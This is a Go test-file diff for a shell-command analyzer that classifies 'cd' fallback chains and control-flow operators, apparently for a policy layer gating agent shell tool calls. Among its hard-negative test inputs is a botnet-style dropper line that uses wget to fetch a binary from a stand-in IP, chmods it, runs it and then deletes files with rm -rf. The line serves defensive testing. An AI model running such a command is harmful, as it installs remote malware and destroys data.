@@ -7,6 +7,7 @@
 package actionfacts
 
 import (
+	"encoding/json"
 	"fmt"
 	"sort"
 	"strings"
@@ -520,6 +521,131 @@ func TestParsePOSIXControlFlowRetainsPositiveFactsWithoutAuthority(t *testing.T)
 				t.Fatalf("paths = %#v", out.paths)
 			}
 		})
+	}
+}
+
+func TestParsePOSIXStandaloneAbsoluteCDFallbackIsAuthoritativeDetectionOnly(t *testing.T) {
+	for _, source := range []string{
+		`cd /tmp || cd /var/run || cd /mnt || cd /root || cd /`,
+		`cd "/tmp/work dir" || cd '/var/run' || cd /`,
+	} {
+		t.Run(source, func(t *testing.T) {
+			facts := Analyze(Input{
+				Tool: "shell", Command: source, CWD: "/repo",
+				DialectHint: DialectPOSIX,
+			})
+			if !facts.Authoritative() || facts.Parse.Status != StatusComplete {
+				t.Fatalf("fallback was not authoritative: %+v", facts)
+			}
+			if facts.EnforcementEligible() ||
+				facts.EnforcementProjection().EnforcementEligible() {
+				t.Fatalf("conditional fallback became enforceable: %+v", facts)
+			}
+			if len(facts.Commands) < 2 {
+				t.Fatalf("fallback commands=%+v", facts.Commands)
+			}
+			for _, command := range facts.Commands {
+				if command.Program != "cd" || !command.ControlFlowUncertain ||
+					command.ControlFlowOperator != ControlFlowOperatorOr ||
+					command.Effect != EffectExecute || !command.ArgvComplete {
+					t.Fatalf("fallback semantics were not preserved: %+v", command)
+				}
+			}
+		})
+	}
+}
+
+func TestParsePOSIXStandaloneAbsoluteCDFallbackHardNegatives(t *testing.T) {
+	for _, source := range []string{
+		`cd /tmp || cd /var/run; wget http://203.0.113.7/x86`,
+		`cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://203.0.113.7/x86; chmod 777 x86; sh x86; rm -rf *`,
+		`cd tmp || cd /var/run`,
+		`cd "$target" || cd /var/run`,
+		`cd /tmp && cd /var/run`,
+		`cd /tmp || pwd`,
+		`cd /tmp 2>/dev/null || cd /var/run`,
+		`env cd /tmp || cd /var/run`,
+		`(cd /tmp || cd /var/run)`,
+		`cd /tmp || cd /var/run &`,
+		"cd /tmp || cd /var/run\npwd",
+	} {
+		t.Run(source, func(t *testing.T) {
+			facts := Analyze(Input{
+				Tool: "shell", Command: source, CWD: "/repo",
+				DialectHint: DialectPOSIX,
+			})
+			if facts.Authoritative() || facts.EnforcementEligible() ||
+				facts.EnforcementProjection().EnforcementEligible() {
+				t.Fatalf("hard negative gained authority: %+v", facts)
+			}
+		})
+	}
+}
+
+func TestParsePOSIXControlFlowOperatorIsClosedAndValueFree(t *testing.T) {
+	tests := []struct {
+		name   string
+		source string
+		want   []CommandControlFlowOperator
+	}{
+		{
+			name:   "unconditional",
+			source: "first\nsecond",
+			want:   []CommandControlFlowOperator{ControlFlowOperatorNone, ControlFlowOperatorNone},
+		},
+		{
+			name:   "and only",
+			source: "first && second && third",
+			want:   []CommandControlFlowOperator{ControlFlowOperatorAnd, ControlFlowOperatorAnd, ControlFlowOperatorAnd},
+		},
+		{
+			name:   "or only",
+			source: "first || second || third",
+			want:   []CommandControlFlowOperator{ControlFlowOperatorOr, ControlFlowOperatorOr, ControlFlowOperatorOr},
+		},
+		{
+			name:   "mixed short circuit",
+			source: "first && second || third",
+			want: []CommandControlFlowOperator{
+				ControlFlowOperatorMixedOrUnsupported,
+				ControlFlowOperatorMixedOrUnsupported,
+				ControlFlowOperatorOr,
+			},
+		},
+		{
+			name:   "nested unsupported context",
+			source: "(first && second)",
+			want: []CommandControlFlowOperator{
+				ControlFlowOperatorMixedOrUnsupported,
+				ControlFlowOperatorMixedOrUnsupported,
+			},
+		},
+	}
+	for _, test := range tests {
+		t.Run(test.name, func(t *testing.T) {
+			out := parsePOSIX(test.source, 1, 0)
+			if len(out.commands) != len(test.want) {
+				t.Fatalf("commands=%#v want %d", out.commands, len(test.want))
+			}
+			for index, command := range out.commands {
+				if command.ControlFlowOperator != test.want[index] {
+					t.Fatalf("command %d operator=%q want=%q", index, command.ControlFlowOperator, test.want[index])
+				}
+			}
+		})
+	}
+}
+
+func TestCommandControlFlowOperatorIsNotSerialized(t *testing.T) {
+	encoded, err := json.Marshal(CommandFact{
+		ControlFlowOperator: ControlFlowOperatorAnd,
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(string(encoded), "ControlFlowOperator") ||
+		strings.Contains(string(encoded), `"and"`) {
+		t.Fatalf("private control-flow operator crossed serialization boundary: %s", encoded)
 	}
 }
 
